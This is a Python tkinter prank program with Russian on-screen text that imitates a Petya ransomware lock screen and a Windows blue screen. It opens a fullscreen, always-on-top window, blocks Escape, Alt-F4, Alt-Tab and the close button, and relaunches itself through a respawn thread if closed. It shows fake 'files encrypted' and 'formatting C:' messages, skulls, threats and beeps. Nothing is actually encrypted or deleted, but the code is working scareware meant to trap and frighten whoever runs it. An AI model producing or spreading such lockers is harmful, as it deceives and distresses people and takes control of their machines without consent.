import tkinter as tk
import random
import ctypes
import threading
import time
import subprocess
import sys
import os

# Константы
W, H = None, None
format_percent = 0
time_left = 30
bsod_mode = False
bsod_timer = 0
exe_path = sys.argv[0]

def self_replicate():
    """Запускает копию себя при закрытии"""
    while True:
        time.sleep(0.5)
        try:
            root.update()
        except:
            subprocess.Popen([exe_path], shell=True)
            os._exit(0)

def draw_bsod(canvas):
    """Рисует СИНИЙ ЭКРАН СМЕРТИ (Windows 10/11 стиль)"""
    global bsod_timer
    
    # Синий фон
    canvas.create_rectangle(0, 0, W, H, fill="#1073c2", outline="")
    
    # Грустный смайлик
    canvas.create_text(W//2, H//2 - 150, text=":(", fill="white", font=("Segoe UI", 120))
    
    # Заголовок
    canvas.create_text(W//2, H//2, 
                      text="У ВАШЕЙ СИСТЕМЫ ВОЗНИКЛА ПРОБЛЕМА",
                      fill="white", font=("Segoe UI", 28, "bold"))
    
    # Текст
    canvas.create_text(W//2, H//2 + 60,
                      text="СКОРО ОНА БУДЕТ ПЕРЕЗАГРУЖЕНА.",
                      fill="white", font=("Segoe UI", 20))
    
    # Код ошибки
    error_codes = [
        "REAPER_SOUL_0xDEADBEEF",
        "PETYA_BLUE_0x8007054D",
        "CRITICAL_PROCESS_DIED",
        "PAGE_FAULT_IN_NONPAGED_AREA",
        "KMODE_EXCEPTION_NOT_HANDLED",
        "0x0000007B (0xF78D2524, 0xC0000034, 0x00000000)"
    ]
    error = random.choice(error_codes)
    
    canvas.create_text(W//2, H//2 + 130,
                      text=f"КОД ОШИБКИ: {error}",
                      fill="white", font=("Consolas", 16))
    
    # Фейковый QR-код (имитация)
    qr_size = 80
    qr_x = W//2 - 120
    qr_y = H//2 + 180
    
    canvas.create_rectangle(qr_x, qr_y, qr_x+qr_size, qr_y+qr_size, fill="black", outline="white", width=2)
    
    for _ in range(200):
        x = qr_x + random.randint(5, qr_size-5)
        y = qr_y + random.randint(5, qr_size-5)
        canvas.create_rectangle(x-2, y-2, x+2, y+2, fill="white", outline="")
    
    canvas.create_text(qr_x + qr_size + 60, qr_y + qr_size//2,
                      text="Считайте QR-код для\nпроклятия своей души",
                      fill="white", font=("Segoe UI", 16), anchor="w")
    
    # ТЕБЯ ЗАМЕТИЛИ
    canvas.create_text(W//2, H - 100,
                      text="⚠️  ТЕБЯ ЗАМЕТИЛИ. ОН УЖЕ В СИСТЕМЕ.  ⚠️",
                      fill="#ffcccc", font=("Arial", 24, "bold"))
    
    # Неубиваемость
    canvas.create_text(W//2, H - 50,
                      text="ТОЛЬКО ПЕРЕЗАГРУЗКА ОСТАНОВИТ ЭТО",
                      fill="white", font=("Arial", 18))

def draw_skull(canvas, cx, cy):
    """Череп Petya"""
    canvas.create_oval(cx-70, cy-70, cx+70, cy+50, fill="black", outline="red", width=3)
    canvas.create_oval(cx-40, cy-40, cx-10, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx+10, cy-40, cx+40, cy-10, fill="black", outline="red", width=3)
    canvas.create_oval(cx-35, cy-35, cx-15, cy-15, fill="red", outline="yellow")
    canvas.create_oval(cx+15, cy-35, cx+35, cy-15, fill="red", outline="yellow")
    canvas.create_polygon(cx-10, cy-5, cx+10, cy-5, cx, cy+15, fill="darkred", outline="red")
    
    for i in range(6):
        x = cx - 25 + i * 10
        canvas.create_rectangle(x, cy+20, x+5, cy+35, fill="white", outline="gray")
    
    canvas.create_line(cx-30, cy-90, cx+30, cy-90, fill="red", width=5)
    canvas.create_line(cx, cy-120, cx, cy-60, fill="red", width=5)
    canvas.create_text(cx, cy-140, text="[ ! ] SYSTEM ERROR", fill="red", font=("Arial", 20, "bold"))

def create_reaper(canvas, cx, cy):
    """Смерть с косой"""
    canvas.create_polygon(cx-80, cy+60, cx+80, cy+60, cx+60, cy-20, cx-60, cy-20, fill="black", outline="darkred", width=2)
    canvas.create_oval(cx-45, cy-80, cx+45, cy+20, fill="black", outline="darkred", width=3)
    canvas.create_oval(cx-20, cy-40, cx+20, cy+0, fill="#050505", outline="darkred", width=2)
    canvas.create_oval(cx-25, cy-35, cx-10, cy-20, fill="red", outline="yellow")
    canvas.create_oval(cx+10, cy-35, cx+25, cy-20, fill="red", outline="yellow")
    canvas.create_oval(cx-22, cy-32, cx-13, cy-23, fill="black")
    canvas.create_oval(cx+13, cy-32, cx+22, cy-23, fill="black")
    canvas.create_line(cx+30, cy-20, cx+150, cy-120, fill="brown", width=8)
    canvas.create_line(cx+30, cy-20, cx+150, cy-120, fill="saddlebrown", width=4)
    canvas.create_polygon(cx+150, cy-120, cx+190, cy-160, cx+210, cy-140, cx+170, cy-100, fill="silver", outline="white", width=2)

def update_timer():
    """Обновляет таймер и процент"""
    global time_left, format_percent, bsod_timer, bsod_mode
    while True:
        time.sleep(0.3)
        if not bsod_mode:
            if time_left > 0:
                time_left -= 0.3
            if format_percent < 100:
                format_percent += random.randint(1, 2)
                if format_percent > 100:
                    format_percent = 100
                    
        bsod_timer += 0.3
        if bsod_timer > 10 and not bsod_mode:
            bsod_mode = True

def glitch():
    global format_percent, time_left, bsod_mode, bsod_timer
    
    canvas.delete("all")
    
    if bsod_mode:
        # --------------------------------------------------------
        # СИНИЙ ЭКРАН СМЕРТИ
        # --------------------------------------------------------
        draw_bsod(canvas)
        
        # Глаза на BSOD (призраки)
        for _ in range(50):
            x = random.randint(0, W)
            y = random.randint(0, H)
            canvas.create_text(x, y, text=random.choice(["◉", "⬤", "@"]), 
                             fill="#a0d0ff", font=("Courier", random.randint(12, 20)))
        
        # Звук BSOD (тихий, грустный)
        ctypes.windll.kernel32.Beep(200, 30)
        
    else:
        # --------------------------------------------------------
        # ОСНОВНОЙ ЭКРАН (PETYA + СМЕРТЬ)
        # --------------------------------------------------------
        canvas.create_rectangle(0, 0, W, H, fill="black", outline="")
        
        # Череп
        draw_skull(canvas, 200, 200)
        
        # Винлокер
        cx = W // 2
        cy = H // 2 - 50
        
        canvas.create_rectangle(cx-350, cy-150, cx+350, cy+250, fill="#0a0a0a", outline="red", width=4)
        canvas.create_text(cx, cy-110, text="⚠️  СИСТЕМА ЗАБЛОКИРОВАНА  ⚠️", 
                          fill="red", font=("Arial", 32, "bold"))
        canvas.create_text(cx, cy-60, text="PETYA RANSOMWARE", 
                          fill="yellow", font=("Arial", 24, "bold"))
        canvas.create_text(cx, cy-30, text="ВАШИ ФАЙЛЫ ЗАШИФРОВАНЫ", 
                          fill="yellow", font=("Arial", 20))
        
        # ТЕБЯ ЗАМЕТИЛИ
        canvas.create_text(cx, cy+10, text="⚠️  ТЕБЯ ЗАМЕТИЛИ. ОН ПРИШЁЛ.  ⚠️", 
                          fill="red", font=("Arial", 26, "bold"))
        
        # Форматирование
        canvas.create_text(cx-250, cy+70, text=f"ФОРМАТИРОВАНИЕ: C:\\ [{int(format_percent)}%]", 
                          fill="white", font=("Courier", 18), anchor="w")
        
        bar_width = 500
        bar_x = cx - 250
        bar_y = cy + 100
        progress_width = int(bar_width * (format_percent / 100))
        
        canvas.create_rectangle(bar_x, bar_y, bar_x + bar_width, bar_y + 25, 
                              outline="gray", fill="#222222")
        canvas.create_rectangle(bar_x, bar_y, bar_x + progress_width, bar_y + 25,
                              outline="", fill="red")
        
        # Таймер до BSOD
        canvas.create_text(cx, cy+150, text=f"ДО СИНЕГО ЭКРАНА: {max(0, 10 - int(bsod_timer))} СЕК", 
                          fill="cyan", font=("Arial", 20))
        
        # Фейковая кнопка
        canvas.create_rectangle(cx-120, cy+190, cx+120, cy+240, 
                              outline="darkred", fill="#330000", width=3)
        canvas.create_text(cx, cy+215, text="РАЗБЛОКИРОВАТЬ (ФЕЙК)", 
                          fill="gray", font=("Arial", 16, "bold"))
        
        # Смерть
        create_reaper(canvas, W-200, H-150)
        
        # Глаза
        for _ in range(150):
            x = random.randint(0, W)
            y = random.randint(0, H)
            canvas.create_text(x, y, text=random.choice(["◉", "⬤", "@", "O"]), 
                             fill="darkred", font=("Courier", random.randint(12, 24)))
        
        # Надписи
        for _ in range(30):
            x = random.randint(50, W-50)
            y = random.randint(50, H-50)
            canvas.create_text(x, y, text=random.choice([
                "ВЫХОДА НЕТ", "ОН СМОТРИТ", "ТВОЯ ДУША",
                "СЗАДИ", "НЕ ОБОРАЧИВАЙСЯ", "ПРОЩАЙ",
                "СКОРО BSOD", "СИНИЙ ЭКРАН"
            ]), fill="darkred", font=("Arial", 20))
        
        # Звук
        ctypes.windll.kernel32.Beep(random.randint(100, 300), 50)
    
    root.after(150, glitch)

# ------------------------------------------------------------
# СОЗДАНИЕ ОКНА
# ------------------------------------------------------------
root = tk.Tk()
W = root.winfo_screenwidth()
H = root.winfo_screenheight()

root.attributes("-fullscreen", True, "-topmost", True)
root.configure(bg="black")
root.overrideredirect(True)

# ПОЛНАЯ БЛОКИРОВКА КЛАВИШ
root.bind("<Escape>", lambda e: None)
root.bind("<Alt-F4>", lambda e: None)
root.bind("<Control>", lambda e: None)
root.bind("<Alt>", lambda e: None)
root.bind("<F4>", lambda e: None)
root.bind("<Control-c>", lambda e: None)
root.bind("<Control-x>", lambda e: None)
root.bind("<Control-w>", lambda e: None)
root.bind("<Alt-Tab>", lambda e: None)

root.protocol("WM_DELETE_WINDOW", lambda: None)

canvas = tk.Canvas(root, width=W, height=H, highlightthickness=0, bg="black")
canvas.pack()

# ЗАПУСК ПОТОКОВ
replicate_thread = threading.Thread(target=self_replicate, daemon=True)
replicate_thread.start()

timer_thread = threading.Thread(target=update_timer, daemon=True)
timer_thread.start()

# ЗАПУСК
glitch()
root.mainloop()